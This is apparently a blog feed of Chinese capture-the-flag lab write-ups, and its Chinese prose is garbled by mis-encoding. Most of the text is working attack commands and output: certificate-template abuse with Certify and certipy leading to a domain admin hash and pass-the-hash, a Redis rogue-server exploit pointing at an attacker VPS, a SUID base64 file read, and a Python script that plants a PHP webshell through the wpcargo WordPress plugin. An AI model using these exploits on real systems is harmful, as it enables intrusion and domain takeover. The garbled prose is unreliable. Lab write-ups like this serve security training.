class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:<span class="string">&quot;XR Manager&quot;</span> /altname:administrator</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Request a Certificates</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Current user context    : XIAORANG\zhangxia</span></span><br><span class="line"><span class="string">[*] No subject name specified, using current context as subject.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Template                : XR Manager</span></span><br><span class="line"><span class="string">[*] Subject                 : CN=zhangxia, CN=Users, DC=xiaorang, DC=lab</span></span><br><span class="line"><span class="string">[*] AltName                 : administrator</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Certificate Authority   : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] CA Response             : The certificate had been issued.</span></span><br><span class="line"><span class="string">[*] Request ID              : 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] cert.pem         :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEpAIBAAKCAQEAuFeHUOimAXdXIeX0QYZjFv3MRkvPLODA4QKxZ3fKWiJXfnWR</span></span><br><span class="line"><span class="string">w6hTC+/RMWTdGWR7R97ybagQjKCxOO5IPuqxh+XX2s/aUfAZVd0+/HXD586+uK0U</span></span><br><span class="line"><span class="string">+W2w7mwrfVYw2dja2+i8bpR6A/QROD3B6S9Ra0uuP04IpifmDIu2Mow6Yo9lwT7D</span></span><br><span class="line"><span class="string">oIMqiKOPoSZQ2Tm5P/OtrfWDyU+qe8x6Ht4ovV2b9S+nnrUm6kPkotvHL465R46t</span></span><br><span class="line"><span class="string">uxpLtZxV+E/zC/8p3vU3qsnaIBRc/h10LOUFCPiiNNvSd0tJWlk7f6KWt2lXmJSl</span></span><br><span class="line"><span class="string">XWj/8C5n1r+R8KrgN0ccYn8mVLG5hljZ1fgF3wIDAQABAoIBAAP6L3s5acuCTaj3</span></span><br><span class="line"><span class="string">kyuOwLiQRUYHALNRLhgsvLMkzILhVs3tr3VvPkt1oyfTq0mO93H3h3eCNskx9mDq</span></span><br><span class="line"><span class="string">Ezj4S1hJRzz7WxSFf6ZwnZlI2S85MLg/U8KF8VlTkCSmJWut2BsCjH4+Sdun+m8i</span></span><br><span class="line"><span class="string">NfrYAIO2IE5RWrJrDfWbVhUFHYVe1UanlurJDpOzBVFTiqJrYBkOPvpjHJwFS9Wk</span></span><br><span class="line"><span class="string">cPvS1NQ0+gvK0Ud3swtMDhXvCmhVx9jWDPwYQFHBEi+g3ynnu6dZ7gi8mAVw/pC7</span></span><br><span class="line"><span class="string">NOGBeCpfEqDmsay5QQVnBOVD3U0vgw78rK5hXIr29teInl0iw89aRAdirlgQQ6ll</span></span><br><span class="line"><span class="string">GzmitaECgYEAyYV2Ix5CiKx+3vCG7ljQ50Bbu9JALfwffCbh1gA5IyVzLajCwu4K</span></span><br><span class="line"><span class="string">7HG4wVrArH42R/Iq4KRxWosWWzTQ9PQNKvUp26/1+OjYf03PdceXiqC2VehewW+9</span></span><br><span class="line"><span class="string">s62WyM9yYPApqEu9ZFjrWhvhcREiufWQLVflJkZEerruLAjhckVqD8cCgYEA6i0k</span></span><br><span class="line"><span class="string">rR07rawOx80SiZ1gCVIWq9wN3hsOK6CLTBVDgCeztX3gNQXxGyaC6+InWojBx2Zt</span></span><br><span class="line"><span class="string">P3vSggChgmwKQU1fbYR7z13tc36+lJhyoqg5/BDFMd7lm3RgAdJo9P2J6Bmopcuf</span></span><br><span class="line"><span class="string">MIhI+iNThEKh7nmh803Os4xZf0pa9RxJTnImiSkCgYEAvpSsK/wjGhRgC8DXKrPu</span></span><br><span class="line"><span class="string">JLUVzCPDtHl64TP4YiVl49o3+hde0XDD/eZyvtFv4/Gcrh/U8wwxc1qUcv8ZGn9v</span></span><br><span class="line"><span class="string">sI+Y3X2klpjGnmZc69stctoYdlhCvJdLhZCGSDT/y7N1AgdW/n6lXVt+sipteAZH</span></span><br><span class="line"><span class="string">Ksq0GKVdf+Am/JgNdb811eMCgYEAx0t6HjZ11r1KqvI1Z5be56/MCaEy0CaYbbqp</span></span><br><span class="line"><span class="string">MiwakVO4lqo1CQswgdnJrDSBJ4Sh3jCmo1Oe+PLOgW+vXpoZr9wDfpzCe/uO+Gmx</span></span><br><span class="line"><span class="string">jgq7pnEjUekP4bguCP7oQjAQkM5dgBSGO0iRSwiLiFEo/QrZMHa0hovYkwNV26qi</span></span><br><span class="line"><span class="string">HLf7YdkCgYBRXkHSgvlvl72uSSIMMXD8lx4XGdo4sKlH44WioeL0M5t5aJiYVQvE</span></span><br><span class="line"><span class="string">DfPePBRKim+PJiloeX0qIxSsEp89qRoN2cXdWpGqX916rz3nZKdQ9UG9g1LsGoyZ</span></span><br><span class="line"><span class="string">BilSirIsDpFtR0oKCp8XyMzIuZ6mRUJNFWDWyfdN0Otj9JyPSyIelg==</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">MIIGQTCCBSmgAwIBAgITfgAAAAWHAI3RYCNargAAAAAABTANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">ADBRMRMwEQYKCZImiZPyLGQBGRYDbGFiMRgwFgYKCZImiZPyLGQBGRYIeGlhb3Jh</span></span><br><span class="line"><span class="string">bmcxIDAeBgNVBAMTF3hpYW9yYW5nLVhJQU9SQU5HLURDLUNBMB4XDTI0MDgwMzE4</span></span><br><span class="line"><span class="string">NTgwNloXDTI1MDgwMzE4NTgwNlowUjETMBEGCgmSJomT8ixkARkWA2xhYjEYMBYG</span></span><br><span class="line"><span class="string">CgmSJomT8ixkARkWCHhpYW9yYW5nMQ4wDAYDVQQDEwVVc2VyczERMA8GA1UEAxMI</span></span><br><span class="line"><span class="string">emhhbmd4aWEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4V4dQ6KYB</span></span><br><span class="line"><span class="string">d1ch5fRBhmMW/cxGS88s4MDhArFnd8paIld+dZHDqFML79ExZN0ZZHtH3vJtqBCM</span></span><br><span class="line"><span class="string">oLE47kg+6rGH5dfaz9pR8BlV3T78dcPnzr64rRT5bbDubCt9VjDZ2Nrb6LxulHoD</span></span><br><span class="line"><span class="string">9BE4PcHpL1FrS64/TgimJ+YMi7YyjDpij2XBPsOggyqIo4+hJlDZObk/862t9YPJ</span></span><br><span class="line"><span class="string">T6p7zHoe3ii9XZv1L6eetSbqQ+Si28cvjrlHjq27Gku1nFX4T/ML/yne9Teqydog</span></span><br><span class="line"><span class="string">FFz+HXQs5QUI+KI029J3S0laWTt/opa3aVeYlKVdaP/wLmfWv5HwquA3RxxifyZU</span></span><br><span class="line"><span class="string">sbmGWNnV+AXfAgMBAAGjggMPMIIDCzA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3</span></span><br><span class="line"><span class="string">FQiB3dAhhYHGIoPFkTqEjedRg9jIBiuBkpQlhInfBwIBZAIBBTApBgNVHSUEIjAg</span></span><br><span class="line"><span class="string">BgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWg</span></span><br><span class="line"><span class="string">MDUGCSsGAQQBgjcVCgQoMCYwDAYKKwYBBAGCNwoDBDAKBggrBgEFBQcDBDAKBggr</span></span><br><span class="line"><span class="string">BgEFBQcDAjBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG</span></span><br><span class="line"><span class="string">9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM1ln9QLzaKk</span></span><br><span class="line"><span class="string">KLs2gDx/+Tw9tmqFMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlz</span></span><br><span class="line"><span class="string">dHJhdG9yMB8GA1UdIwQYMBaAFFe6Z2kqz4ktl3hku7D+cH+iSYCiMIHaBgNVHR8E</span></span><br><span class="line"><span class="string">gdIwgc8wgcyggcmggcaGgcNsZGFwOi8vL0NOPXhpYW9yYW5nLVhJQU9SQU5HLURD</span></span><br><span class="line"><span class="string">LUNBLENOPVhJQU9SQU5HLURDLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2</span></span><br><span class="line"><span class="string">aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXhpYW9yYW5nLERD</span></span><br><span class="line"><span class="string">PWxhYj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9</span></span><br><span class="line"><span class="string">Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcoGCCsGAQUFBwEBBIG9MIG6MIG3BggrBgEF</span></span><br><span class="line"><span class="string">BQcwAoaBqmxkYXA6Ly8vQ049eGlhb3JhbmctWElBT1JBTkctREMtQ0EsQ049QUlB</span></span><br><span class="line"><span class="string">LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp</span></span><br><span class="line"><span class="string">Z3VyYXRpb24sREM9eGlhb3JhbmcsREM9bGFiP2NBQ2VydGlmaWNhdGU/YmFzZT9v</span></span><br><span class="line"><span class="string">YmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUA</span></span><br><span class="line"><span class="string">A4IBAQADETRmjot+K43S5/SfkTCozzcSqu/RqT8Z/UBP1OTz9GPVLXp+bE665ZEf</span></span><br><span class="line"><span class="string">8FRLoOOiQmCFuldH3eL379LpogpT71Ebo6hwjrlnP/LpL5b3m/spqxSW2CgE+BMe</span></span><br><span class="line"><span class="string">ddL3DJAC2P5P18bGkDVrUp0yYYmsPc+2eeuVGcROcaSBe/WCopddYP8iQkVlR53Q</span></span><br><span class="line"><span class="string">IyAatff+yMd7P6TjYLH2yXylLGZ3Z66Dy53c0wEZLC5IXOiY5MfhgJCHgEd4xQgQ</span></span><br><span class="line"><span class="string">DhE8XcCRFldRWeUaUTe3VHaC5HnhJA+/3ZmruLdEPjxHZCFAombzoCuxLqsvEvwc</span></span><br><span class="line"><span class="string">2liMB3A/cbWoZItBw59Sbfll6MY+</span></span><br><span class="line"><span class="string">-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br></pre></td></tr></table></figure><p>å°†<code>-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----</code>å¤åˆ¶ä¿å­˜ä¸º<code>cert.pem</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -<span class="keyword">in</span> cert.pem -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx</span><br></pre></td></tr></table></figure><p>å°†cert.pemè½¬æ¢ä¸ºcert.pfxï¼Œä¸éœ€è¦è¾“å…¥å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /dc:172.22.9.7 /ptt</span><br></pre></td></tr></table></figure><p>å¯„ï¼Œå¤±è´¥äº†ï¼Œæ¢ä¸€ç§æ–¹å¼ç»§ç»­ç”³è¯·</p><p>æŸ¥è¯¢å­˜åœ¨å“ªäº›è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy find -u <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span>  -password <span class="string">&#x27;MyPass2@@6&#x27;</span> -dc-ip 172.22.9.7 -vulnerable -stdout 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>ç»§ç»­ç”³è¯·è¯ä¹¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy req -u <span class="string">&#x27;zhangxia@xiaorang.lab&#x27;</span> -p <span class="string">&#x27;MyPass2@@6&#x27;</span> -target 172.22.9.7 -dc-ip 172.22.9.7 -ca <span class="string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="string">&#x27;XR Manager&#x27;</span>  -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p>å¾—åˆ°administrator.pfxï¼Œä½¿ç”¨è·å¾—çš„è¯ä¹¦è·å–åŸŸç®¡å“ˆå¸Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@xiaorang.lab&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure><p>PTHè·å–åŸŸæ§æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atype c:\users\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><h2 id="flag04">flag04</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Brute4Road</title>
    <link href="https://bowuchuling.github.io/posts/chunqiuBrute4Road.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiuBrute4Road.html</id>
    <published>2024-08-20T15:14:33.336Z</published>
    <updated>2024-08-20T15:34:49.971Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Brute4Road</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">39.99.146.22:21 open</span><br><span class="line">39.99.146.22:6379 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp 39.99.146.22:21:anonymous</span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[+] Redis 39.99.146.22:6379 unauthorized file:/usr/local/redis/db/dump.rdb</span><br></pre></td></tr></table></figure><p>æ‰«çš„ä¸å…¨ï¼Œä½†æ˜¯ä¸»è¦çš„æ‰«å‡ºæ¥å°±è¡Œäº†ï¼Œredisçš„æœªæˆæƒè®¿é—®ï¼Œåˆ©ç”¨å·²çŸ¥è„šæœ¬å¯ä»¥ç›´æ¥æ‹¿shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost ç›®æ ‡ip --lhost vpsip</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨CSä¸Šçº¿åšæŒä¹…åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure><p>suidæƒé™ï¼Œä½¿ç”¨base64è¯»å–flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> <span class="string">&#x27;/home/redis/flag/flag01&#x27;</span> | <span class="built_in">base64</span> --decode</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«å†…ç½‘ï¼Œæ­ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.2.7  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe04:2374  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:04:23:74  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 125541  bytes 165100176 (157.4 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 67835  bytes 17702141 (16.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.2.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.34</span><br><span class="line">   [-&gt;]CLIENT01</span><br><span class="line">   [-&gt;]172.22.2.34</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.16</span><br><span class="line">   [-&gt;]MSSQLSERVER</span><br><span class="line">   [-&gt;]172.22.2.16</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.2.3</span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]172.22.2.3</span><br><span class="line">[*] NetBios: 172.22.2.34     XIAORANG\CLIENT01              </span><br><span class="line">[*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02         </span><br><span class="line">[*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found</span><br><span class="line">[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] ftp://172.22.2.7:21:anonymous </span><br><span class="line">   [-&gt;]pub</span><br><span class="line">[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.2.18        code:200 len:57738  title:åˆä¸€ä¸ªWordPressç«™ç‚¹</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨ä¸€ä¸ªwordpressç«™ç‚¹ï¼Œwpscanå…ˆæ‰«ä¸€æ³¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820192138530.png" alt="image-20240820192138530"></p><p>åˆ©ç”¨æ’ä»¶æ¼æ´ä¸Šä¼ shellï¼Œæ‹¿åˆ°18çš„shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line"></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line"></span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line"></span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img 